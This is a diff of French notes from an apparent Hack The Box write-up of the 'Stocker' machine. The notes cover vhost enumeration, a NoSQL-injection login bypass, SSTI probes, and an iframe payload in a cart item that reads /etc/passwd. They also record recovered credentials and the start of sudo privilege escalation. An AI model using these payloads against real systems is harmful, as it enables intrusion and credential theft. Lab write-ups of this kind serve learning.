@@ -7,10 +7,8 @@ Status: pending
 public: true
 IP: 10.10.11.196
 ---
+
 ![[Stocker-1.png]]
-
-
-
 
 ```
 └─# gobuster vhost -u stocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --append-domain
@@ -37,10 +35,10 @@ Progress: 10409 / 220561 (4.72%)^C
 
 ```
 
-
 vhost trouvé via vhost enumeration : dev.stocker.htb
 
 Bypass de l'authent avec au format JSON une NoSQL injection :
+
 ```
 POST /login HTTP/1.1
 Host: dev.stocker.htb
@@ -62,6 +60,7 @@ Upgrade-Insecure-Requests: 1
 Tentative de SSTI avec ${7*7} et
 
 Brute force du username : angoose
+
 Brute force du password : b3e795719e2a644f69838a593dd159ac
 
 "$;|^{{}}''"
@@ -69,10 +68,13 @@ Brute force du password : b3e795719e2a644f69838a593dd159ac
 {"_id":"638f116eeb060210cbd83a93","title":"Toilet Paper","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0}
 
 user length : 7  angoose
-password length : 32 chars   
+
+password length : 32 chars
 
 il y a un endpoint /api/products
+
 							/api/po/
+
 						
 - il y a peut être d'autre endpoint en 2 chars ??
 - revoir si on ne peut pas ajouter un product ou en modifier 1 ???
@@ -112,13 +114,10 @@ Cookie: connect.sid=s%3Avl0rPp-i53IWRGNVdk7aCDRGnBn-yuyG.InPe1bsghz6TrAW2SEdKTwY
 {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src=/etc/passwd height=900 width=500></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
 ```
 
-
 password : IHeardPassphrasesArePrettySecure (from /var/www/dev/index.js)
 
-
-
-
 privesc
+
 ```
 Matching Defaults entries for angoose on stocker:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
